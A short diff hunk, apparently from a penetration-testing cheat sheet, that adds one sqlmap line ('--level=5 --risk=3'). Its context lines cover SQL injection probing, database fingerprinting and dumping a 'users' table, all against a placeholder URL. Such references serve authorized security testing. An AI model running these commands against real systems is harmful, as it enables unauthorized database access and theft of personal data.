@@ -663,6 +663,7 @@ $ sqlmap -u <URL> -v 6 --batch
 $ sqlmap -u <URL> --proxy=http://127.0.0.1:8080
 $ sqlmap -u <URL> --prefix="%'))" --suffix="-- -"
 $ sqlmap -u <URL> -v 3 --level=5
+$ sqlmap -u <URL> --level=5 --risk=3
 $ sqlmap -u <URL> --banner --current-user --current-db --is-dba
 $ sqlmap -u <URL> --tables -D testdb
 $ sqlmap -u <URL> --dump -T users -D testdb -C name,surname
